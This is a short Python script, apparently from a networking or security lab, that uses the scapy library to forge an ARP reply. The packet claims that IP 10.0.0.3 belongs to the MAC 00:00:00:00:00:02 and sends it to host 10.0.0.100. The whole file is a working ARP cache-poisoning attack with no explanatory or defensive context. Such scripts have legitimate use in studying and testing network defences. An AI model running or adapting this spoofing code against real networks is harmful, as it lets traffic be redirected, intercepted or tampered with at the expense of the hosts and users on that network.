from scapy.all import *
import sys

a = ARP(hwsrc='00:00:00:00:00:02', psrc='10.0.0.3', pdst='10.0.0.100',hwdst='00:11:22:33:44:55', op=2)
e = Ether(src='00:00:00:00:00:02', dst='00:11:22:33:44:55')
arp = e/a
sendp(arp)

